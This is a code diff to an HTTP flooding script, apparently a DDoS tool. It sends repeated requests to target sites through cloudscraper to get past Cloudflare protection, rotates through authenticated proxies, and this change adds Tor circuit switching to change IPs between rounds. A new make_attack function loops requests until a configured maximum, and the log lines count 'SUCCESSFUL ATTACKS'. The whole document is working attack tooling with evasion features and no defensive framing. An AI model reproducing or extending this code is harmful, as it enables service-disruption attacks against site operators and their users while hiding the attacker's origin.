@@ -17,6 +17,7 @@ from urllib3 import disable_warnings
 
 from settings import get_settings
 from remote_provider import RemoteProvider
+from tor_proxy import TorProxy
 
 settings = get_settings()
 disable_warnings()
@@ -42,7 +43,7 @@ remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
 
 executor = ThreadPoolExecutor(max_workers=threads)
-
+tor_proxy = TorProxy(port=settings.TOR_PORT, control_port=settings.TOR_CONTROL_PORT, password=settings.TOR_PASSWORD)
 
 def set_logger_format():
     logger.remove()
@@ -64,6 +65,17 @@ def check_req():
     os.system("pip3 install -r requirements.txt")
 
 
+def make_attack(site: str, scraper):
+    attacks_number = 0
+    response = scraper.get(site, timeout=settings.READ_TIMEOUT)
+    while attacks_number < settings.MAX_REQUESTS_TO_SITE:
+        response = scraper.get(site, timeout=settings.READ_TIMEOUT)
+        if response.status_code >= 400:
+            break
+        attacks_number += 1
+    return attacks_number, response.status_code
+
+
 def mainth(site: str):
     scraper = cloudscraper.create_scraper(
         browser=settings.BROWSER
@@ -79,30 +91,30 @@ def mainth(site: str):
     try:
         attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
         if attack.status_code >= 302:
-            for proxy in remoteProvider.get_proxies():
-                if proxy_view:
-                    logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
-                scraper.proxies.update(
-                    {
-                        'http': f'http://{proxy["auth"]}@{proxy["ip"]}',
-                        'https': f'https://{proxy["auth"]}@{proxy["ip"]}'
-                    }
-                )
-                response = scraper.get(site, timeout=settings.READ_TIMEOUT)
-                if 200 <= response.status_code <= 302:
-                    while attacks_number < settings.MAX_REQUESTS_TO_SITE:
-                        response = scraper.get(site, timeout=settings.READ_TIMEOUT)
-                        if response.status_code >= 400:
-                            break
-                        attacks_number += 1
-                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
+            if not settings.ENABLE_TOR:
+                for proxy in remoteProvider.get_proxies():
+                    if proxy_view:
+                        logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
+                    scraper.proxies.update(
+                        {
+                            'http': f'http://{proxy["auth"]}@{proxy["ip"]}',
+                            'https': f'https://{proxy["auth"]}@{proxy["ip"]}'
+                        }
+                    )
+                    loop_attacks_number, response_code = make_attack(site, scraper)
+                    attacks_number += loop_attacks_number
+                    logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response_code}")
+            else:
+                tor_proxy.change_ip()
+                logger.info(f"USING tor proxy with ip {tor_proxy.get_ip()}")
+                scraper.proxies.update(tor_proxy.get_sock5_proxies())
+                attacks_count, response_code = make_attack(site, scraper)
+                attacks_number += attacks_count
+                logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response_code}")
         else:
-            while attacks_number < settings.MAX_REQUESTS_TO_SITE:
-                response = scraper.get(site, timeout=settings.READ_TIMEOUT)
-                if response.status_code >= 400:
-                    break
-                attacks_number += 1
-                logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
+            attacks_count, response_code = make_attack(site, scraper)
+            attacks_number += attacks_count
+            logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
     except ConnectionError:
